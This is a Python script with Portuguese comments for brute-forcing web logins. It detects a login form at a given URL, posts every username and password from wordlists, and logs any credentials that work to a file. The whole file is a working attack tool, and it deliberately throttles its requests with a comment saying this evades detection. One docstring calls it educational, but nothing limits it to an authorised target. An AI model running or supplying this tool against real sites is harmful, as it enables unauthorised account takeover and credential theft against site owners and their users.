#!/usr/bin/env python3

import requests
import sys
import time
from bs4 import BeautifulSoup

class WebBruteForcer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def detect_login_form(self):
        """
        Detectar formulário de login na página
        """
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Procurar formulários de login
            forms = soup.find_all('form')
            login_form = None
            
            for form in forms:
                if form.find('input', {'type': 'password'}):
                    login_form = form
                    break
            
            return login_form
        except Exception as e:
            print(f"[-] Erro ao detectar formulário: {e}")
            return None
    
    def brute_force(self, users_file, passwords_file):
        """
        Realizar ataque de força bruta educacional
        """
        try:
            with open(users_file, 'r') as uf, open(passwords_file, 'r') as pf:
                users = [line.strip() for line in uf if line.strip()]
                passwords = [line.strip() for line in pf if line.strip()]
            
            print(f"[+] Iniciando força bruta contra {self.target_url}")
            print(f"[+] Usuários: {len(users)}, Senhas: {len(passwords)}")
            
            for user in users:
                for password in passwords:
                    # Simular tentativa de login (adaptar conforme o alvo)
                    credentials = {
                        'username': user,
                        'password': password,
                        'submit': 'Login'
                    }
                    
                    try:
                        response = self.session.post(self.target_url, data=credentials)
                        
                        # Verificar se o login foi bem-sucedido
                        if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                            print(f"[+] CREDENCIAIS ENCONTRADAS: {user}:{password}")
                            with open('results/web_credentials.txt', 'a') as f:
                                f.write(f"{user}:{password}\n")
                            return
                            
                    except Exception as e:
                        print(f"[-] Erro na requisição: {e}")
                    
                    # Delay para evitar detecção
                    time.sleep(0.5)
                    
        except FileNotFoundError as e:
            print(f"[-] Arquivo não encontrado: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python3 brute_force_web.py <url_alvo>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    brute_forcer = WebBruteForcer(target_url)
    
    # Carregar wordlists
    users_file = "wordlists/common_users.txt"
    passwords_file = "wordlists/common_passwords.txt"
    
    brute_forcer.brute_force(users_file, passwords_file)
